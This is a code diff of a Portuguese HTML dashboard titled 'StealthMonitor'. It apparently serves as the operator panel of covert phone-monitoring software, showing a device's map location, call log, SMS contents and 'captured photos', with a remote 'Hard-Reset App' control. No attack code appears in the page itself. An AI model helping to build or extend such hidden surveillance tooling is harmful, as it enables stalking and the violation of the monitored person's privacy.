@@ -1,38 +1,64 @@
 <!DOCTYPE html>
 <html lang="pt">
 <head>
-  <meta charset="UTF-8"/>
-  <title>Dashboard</title>
-  <link rel="stylesheet" href="css/style.css"/>
-  <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css"/>
-  <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
+  <meta charset="UTF-8" />
+  <title>StealthMonitor – Dashboard</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+
+  <link rel="stylesheet" href="css/style.css" />
+  <link
+    rel="stylesheet"
+    href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"
+  />
+  <style>
+    body,html { margin:0; padding:0; font-family:sans-serif; }
+    header { padding:1rem; background:#333; color:#fff; display:flex; justify-content:space-between; align-items:center; }
+    #map { height:300px; }
+    section { padding:1rem; }
+    table { width:100%; border-collapse:collapse; margin-top:.5rem; }
+    th, td { border:1px solid #ccc; padding:.5rem; text-align:left; }
+    th { background:#f0f0f0; }
+    #photos img { max-width:100px; margin:0.5rem; border:1px solid #ddd; }
+  </style>
 </head>
 <body>
-  <button onclick="logout()">Logout</button>
-  <h2>Dashboard</h2>
-  <div id="map" style="height:300px;"></div>
-  <h3>Chamadas</h3><table id="calls"><thead><tr><th>Num</th><th>Tipo</th><th>Dur</th></tr></thead><tbody></tbody></table>
-  <h3>SMS</h3><table id="sms"><thead><tr><th>De</th><th>Texto</th></tr></thead><tbody></tbody></table>
-  <script>
-    const token = localStorage.getItem('token');
-    if (!token) location.href = '/';
-    function logout() {
-      localStorage.removeItem('token');
-      location.href = '/';
-    }
-    fetch('/api/data', { headers:{ Authorization:'Bearer '+token }})
-      .then(r=>r.json()).then(data => {
-        const map = L.map('map').setView([0,0],2);
-        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
-        data.forEach(d => {
-          const {lat,lng} = d.location;
-          L.marker([lat,lng]).addTo(map);
-          const trCall = `<tr><td>${d.calls.length}</td><td>-</td><td>-</td></tr>`;
-          document.querySelector('#calls tbody').innerHTML += trCall;
-          const trSMS = `<tr><td>${d.sms.length}</td><td>-</td></tr>`;
-          document.querySelector('#sms tbody').innerHTML += trSMS;
-        });
-      });
-  </script>
+  <header>
+    <div>
+      <button id="logout">Logout</button>
+      <button id="hardReset">Hard-Reset App</button>
+    </div>
+    <button id="refresh">🔄 Atualizar</button>
+  </header>
+
+  <section>
+    <h2>Localização</h2>
+    <div id="map"></div>
+  </section>
+
+  <section>
+    <h2>Chamadas</h2>
+    <table id="callsTable">
+      <thead><tr><th>Número</th><th>Tipo</th><th>Duração(s)</th><th>Hora</th></tr></thead>
+      <tbody></tbody>
+    </table>
+  </section>
+
+  <section>
+    <h2>SMS</h2>
+    <table id="smsTable">
+      <thead><tr><th>De</th><th>Conteúdo</th><th>Hora</th></tr></thead>
+      <tbody></tbody>
+    </table>
+  </section>
+
+  <section>
+    <h2>Fotos Capturadas</h2>
+    <div id="photos"></div>
+  </section>
+
+  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+  <script src="js/dashboard.js"></script>
+</body>
+</html>
 </body>
 </html>
